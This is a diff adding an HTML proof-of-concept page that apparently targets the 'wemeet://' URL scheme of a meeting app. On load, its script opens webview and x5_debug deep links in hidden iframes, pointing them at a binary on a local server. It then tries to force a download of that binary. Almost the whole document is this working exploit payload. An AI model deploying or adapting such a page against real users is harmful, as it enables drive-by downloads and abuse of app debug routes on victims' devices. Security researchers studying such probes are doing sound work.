@@ -1,0 +1,35 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P27</h1>
+<script>
+document.title='P27L-START';
+var bin='http://127.0.0.1:8765/p27.bin';
+var schemes=[
+  'wemeet://page/webview?url='+encodeURIComponent(bin),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(bin)
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){
+    document.title='P27L-DL';
+    try {
+      var f=document.createElement('iframe');
+      f.src=bin;
+      document.body.appendChild(f);
+    } catch(e){}
+    setTimeout(function(){
+      try { location.href=bin; } catch(e2){}
+      document.title='P27L-DONE';
+    }, 2000);
+    return;
+  }
+  var s=schemes[i++];
+  document.title='P27L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 2500);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
